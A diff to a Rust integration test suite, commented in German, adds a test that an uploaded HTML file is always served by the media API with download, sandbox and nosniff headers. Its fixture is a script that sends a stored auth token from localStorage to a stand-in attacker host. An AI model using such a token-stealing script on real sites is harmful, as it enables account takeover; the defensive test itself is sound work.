@@ -336,6 +336,78 @@ async fn gefaehrliche_dateien_werden_nicht_angezeigt_harmlose_schon() {
     );
 }
 
+/// Was nicht angezeigt werden darf, wird auch nicht umgeleitet.
+///
+/// Der Schutz gegen eine hochgeladene `.html` entsteht erst beim Zusammenbauen
+/// der Antwort: Positivliste, `nosniff`, `sandbox`-CSP, Anhang-Kopfzeile. Auf
+/// dem Umleitungsweg (R2/S3 ohne `MEDIA_KEY`) gab es davon nichts – dort
+/// entschied der Eimer über Typ und Darstellung, und die signierte Adresse
+/// trägt `text/html` aus der Datenbank.
+///
+/// Der Test prüft die Regel dort, wo sie beobachtbar ist: Beim lokalen
+/// Speicher wird ohnehin nie umgeleitet, also muss jede Antwort – ob harmlos
+/// oder nicht – aus der API kommen und die Kopfzeilen tragen. Die Bedingung
+/// selbst steht in `serve` und gilt für jede Speicherart.
+#[tokio::test(flavor = "multi_thread")]
+async fn eine_html_datei_kommt_immer_durch_die_api() {
+    let Some((probe, token)) = aufbauen().await else {
+        eprintln!("TEST_DATABASE_URL nicht gesetzt – übersprungen");
+        return;
+    };
+
+    let kennung = probe
+        .hochladen(
+            &token,
+            "file",
+            "text/html",
+            "seite.html",
+            b"<script>fetch('//boese.example/'+localStorage.getItem('initiative.tokens'))</script>",
+        )
+        .await;
+
+    let (status, kopf, _) = probe
+        .roh(
+            "GET",
+            &format!("/api/v1/media/{kennung}"),
+            Some(&token),
+            vec![],
+            Body::empty(),
+        )
+        .await;
+
+    // Keine Umleitung, sondern die Antwort der API selbst.
+    assert_eq!(status, StatusCode::OK, "keine Umleitung fuer text/html");
+    assert!(
+        kopfzeile(&kopf, "content-disposition").starts_with("attachment"),
+        "eine .html wird heruntergeladen, nicht dargestellt"
+    );
+    assert!(
+        kopfzeile(&kopf, "content-security-policy").contains("sandbox"),
+        "und selbst dann liegt sie in einem leeren Ursprung ohne Skript"
+    );
+    assert_eq!(kopfzeile(&kopf, "x-content-type-options"), "nosniff");
+
+    // Ein Bild darf dagegen dargestellt werden – sonst prueft der Test nur,
+    // dass gar nichts geht.
+    let bild = probe
+        .hochladen(&token, "image", "image/png", "harmlos.png", &png_pixel())
+        .await;
+    let (status, kopf, _) = probe
+        .roh(
+            "GET",
+            &format!("/api/v1/media/{bild}"),
+            Some(&token),
+            vec![],
+            Body::empty(),
+        )
+        .await;
+    assert_eq!(status, StatusCode::OK);
+    assert!(
+        kopfzeile(&kopf, "content-disposition").is_empty(),
+        "ein PNG wird angezeigt, nicht angehaengt"
+    );
+}
+
 /// Eine fremde Anhangskennung wird nicht zum eigenen Bild.
 ///
 /// Die Kennung ist in dieser API der Schlüssel zur Datei – wer sie kennt, darf
